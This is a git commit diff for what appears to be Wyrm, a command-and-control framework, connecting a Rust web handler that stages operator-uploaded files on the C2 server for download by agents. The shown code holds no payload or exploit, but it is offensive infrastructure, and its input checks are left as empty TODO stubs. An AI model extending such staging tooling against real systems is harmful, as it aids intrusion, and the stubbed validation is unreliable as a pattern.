43c49e18a9a3e4b52794ad52163aa4d7606e8d33
flux <49762827+0xflux@users.noreply.github.com>
2025-09-28 19:25:28 +0100

    File upload is now connected - just needs some error handling and maybe input validation.

--- client_v2/src/api/file_upload.rs
+++ client_v2/src/api/file_upload.rs
@@ -1,10 +1,20 @@
+use std::sync::Arc;
+
 use axum::{
     Form,
-    extract::Multipart,
+    extract::{Multipart, State},
     http::StatusCode,
-    response::{IntoResponse, Response},
+    response::{IntoResponse, Redirect, Response},
 };
-use shared::pretty_print::print_failed;
+use shared::{
+    pretty_print::print_failed,
+    tasks::{AdminCommand, FileUploadStagingFromClient, WyrmResult},
+};
+
+use crate::{
+    models::AppState,
+    net::{IsTaskingAgent, api_request},
+};
 
 #[derive(Default)]
 pub struct FileUploadData {
@@ -13,7 +23,7 @@ pub struct FileUploadData {
     file_data: Vec<u8>,
 }
 
-pub async fn upload_file_api(mut multipart: Multipart) -> Response {
+pub async fn upload_file_api(state: State<Arc<AppState>>, mut multipart: Multipart) -> Response {
     let mut form_data = FileUploadData::default();
 
     while let Some(field) = multipart.next_field().await.ok().flatten() {
@@ -26,11 +36,55 @@ pub async fn upload_file_api(mut multipart: Multipart) -> Response {
         }
     }
 
-    println!(
-        "Received: {}, at: /{}, len: {}",
-        form_data.download_name,
-        form_data.download_api,
-        form_data.file_data.len()
-    );
-    StatusCode::OK.into_response()
+    if form_data.download_name.is_empty() || form_data.download_api.is_empty() {
+        // TODO return bad
+    }
+
+    if form_data.file_data.len() == 0 {
+        // TODO return bad
+    }
+
+    let staging_info = FileUploadStagingFromClient {
+        download_name: form_data.download_name,
+        api_endpoint: form_data.download_api,
+        file_data: form_data.file_data,
+    };
+
+    let creds_lock = {
+        state
+            .creds
+            .read()
+            .await
+            .clone()
+            .expect("credentials not found")
+    };
+
+    let response: WyrmResult<String> = match api_request(
+        AdminCommand::StageFileOnC2(staging_info),
+        &IsTaskingAgent::No,
+        &creds_lock,
+    )
+    .await
+    {
+        Ok(r) => match serde_json::from_slice(&r) {
+            Ok(r) => r,
+            Err(e) => {
+                // TODO return bad
+                println!("An error was encountered deserialising the response, {e}");
+                return StatusCode::INTERNAL_SERVER_ERROR.into_response();
+            }
+        },
+        Err(e) => {
+            println!("An error was encountered uploading your file, {e}");
+            return StatusCode::INTERNAL_SERVER_ERROR.into_response();
+        }
+    };
+
+    if let WyrmResult::Err(e) = response {
+        // TODO
+        println!("RESPONSE ERR: {:?}", e);
+        return StatusCode::INTERNAL_SERVER_ERROR.into_response();
+    } else {
+        return Redirect::to("/dashboard").into_response();
+    }
 }
